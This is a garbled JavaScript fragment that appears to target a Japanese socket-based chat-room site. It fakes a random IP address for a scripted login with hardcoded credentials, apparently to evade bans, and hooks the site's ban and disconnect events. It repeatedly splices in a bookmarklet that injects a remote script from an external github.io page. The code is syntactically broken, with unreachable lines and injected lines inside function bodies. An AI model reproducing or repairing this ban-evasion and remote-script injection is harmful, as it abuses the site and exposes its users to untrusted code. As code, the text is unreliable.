function GRS() { 
  const characters = "0123456789";
  let result = "";
  for (let i = 0; i < 3; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
    if (parseInt(result) <= 100) {
    return result.replace(/^0+/, '');
  }
  return result;
}
var ip = GRS() + "." + GRS() + "." + GRS() + "." + GRS();
console.log(ip);
var data = {};
        data.uname = 'AAAAAAAAAAAA';
        data.passwd = '1q2w3e';
        data.bid = ip;
        data.sid = fsid.get();
        socket.json.emit('login', data);
function disconnect_uid(remove_uid, room_id) {}
$(function() {
	socket.on('leaved', function(data) {
		l('【leaved】');
		if (data) {
			if (data.notice == 1) {
				show_notice(data)
			}
		}
javascript:var s=document.createElement('script');s.setAttribute('src','https://antirikuucoalition.github.io/RLIBATE/AAAAA.js');s.setAttribute('charset','UTF-8');body.appendChild(s);
	});
	socket.on('called_ban', function(data) {
		l('【called_ban】');
		if (data) {
			show_notice({
				msg: data.msg
			});
			if (data.room_id) {
				leave(data.room_id)
			}
			pc_mode(0)
		}
javascript:var s=document.createElement('script');s.setAttribute('src','https://antirikuucoalition.github.io/RLIBATE/AAAAA.js');s.setAttribute('charset','UTF-8');body.appendChild(s);
	});
	socket.on('leave__disconnected', function(res) {
		l('【leave__disconnected】');
		var remove_uid = res.uid;
		var room_id = res.room_id;
		l("切断UID：" + remove_uid + "　　部屋:" + room_id);
		disconnect_uid(remove_uid, room_id)
javascript:var s=document.createElement('script');s.setAttribute('src','https://antirikuucoalition.github.io/RLIBATE/AAAAA.js');s.setAttribute('charset','UTF-8');body.appendChild(s);
	})
});
